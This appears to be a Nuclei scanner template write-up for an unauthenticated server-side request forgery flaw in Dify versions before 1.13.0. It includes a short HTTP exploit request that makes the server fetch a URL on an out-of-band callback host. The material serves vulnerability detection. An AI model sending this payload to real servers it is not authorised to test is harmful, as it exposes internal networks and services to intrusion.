# Nuclei Template: Dify < 1.13.0 - Unauthenticated SSRF via Remote File Upload
**Template ID:** dify-ssrf-remote-upload
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`dify-ssrf-remote-upload.yaml`)

## Vulnerability Information & PoC

## Description
Detected Dify prior to 1.13.0 is vulnerable to unauthenticated Server-Side Request Forgery via the /console/api/remote-files/upload endpoint. The endpoint accepted a user-controlled URL parameter and issued HTTP requests from the server without authentication or SSRF protections such as private IP blocking.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /console/api/remote-files/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"url":"http://{{interactsh-url}}/ssrf-test"}
```

## References
- https://github.com/langgenius/dify/security/advisories/GHSA-8235-vv5j-mmvg
